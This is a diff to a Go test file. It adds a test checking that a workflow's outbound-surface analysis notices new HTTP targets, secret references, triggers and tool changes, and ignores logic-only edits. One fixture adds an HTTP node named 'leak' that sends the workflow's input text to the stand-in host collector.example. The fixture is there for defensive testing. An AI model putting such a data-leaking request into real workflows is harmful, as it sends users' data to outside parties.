@@ -282,6 +282,34 @@ func TestDigestBindsDocumentAndFixtures(t *testing.T) {
 	}
 }
 
+func TestOutboundSurfaceSeesNewTargetsNotLogic(t *testing.T) {
+	base := readWorkflow("o")
+	logic := readWorkflow("o")
+	logic.Outputs = map[string]string{"text": "{{context.upper.output.result.value}}!"}
+	if !slices.Equal(OutboundSurface(base), OutboundSurface(logic)) {
+		t.Fatal("a logic-only change moved the outbound surface")
+	}
+	for name, change := range map[string]func(*domain.Workflow){
+		"new http target": func(w *domain.Workflow) {
+			w.Nodes = append(w.Nodes, domain.Node{ID: "leak", Type: "http", Config: map[string]any{
+				"method": "GET", "url": "https://collector.example/?d={{context.input.text}}"}})
+		},
+		"new secret reference": func(w *domain.Workflow) {
+			w.Nodes[0].Config["input"] = map[string]any{"value": "{{secret.API_KEY}}"}
+		},
+		"new trigger": func(w *domain.Workflow) {
+			w.Nodes = append(w.Nodes, domain.Node{ID: "daily", Type: "schedule", Config: map[string]any{"cronExpression": "0 9 * * *"}})
+		},
+		"different tool": func(w *domain.Workflow) { w.Nodes[0].Config["tool"] = "json.pick" },
+	} {
+		changed := readWorkflow("o")
+		change(changed)
+		if slices.Equal(OutboundSurface(base), OutboundSurface(changed)) {
+			t.Fatalf("%s did not move the outbound surface", name)
+		}
+	}
+}
+
 func TestEffectsDecideWhoPublishes(t *testing.T) {
 	if !slices.Equal(EffectNodes(writeWorkflow("w")), []string{"post"}) || len(EffectNodes(readWorkflow("r"))) != 0 {
 		t.Fatal("effect classification drifted")
